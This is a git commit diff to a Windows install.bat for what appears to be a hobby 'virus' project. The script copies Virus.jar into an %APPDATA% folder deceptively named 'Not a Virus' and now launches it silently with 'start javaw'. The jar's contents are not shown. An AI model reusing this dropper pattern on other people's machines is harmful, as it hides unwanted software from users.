26afcca5b65af0e477409f8d5cbe26831477c08d
Adam Torres <atorres1929@gmail.com>
2015-09-17 13:19:06 -0400

    Updated Install.bat
    Changed it so install.bat closes after start up of virus

--- install.bat
+++ install.bat
@@ -2,6 +2,4 @@
 cd C:
 mkdir "%APPDATA%\Not a Virus"
 copy "%CD%\Virus\dist\Virus.jar" "%APPDATA%\Not a Virus\Virus.jar"
-javaw -jar "%APPDATA%\Not a Virus\Virus.jar"
-@echo Instalation complete! Enjoy your virus!
-@pause
+start javaw -jar "%APPDATA%\Not a Virus\Virus.jar"
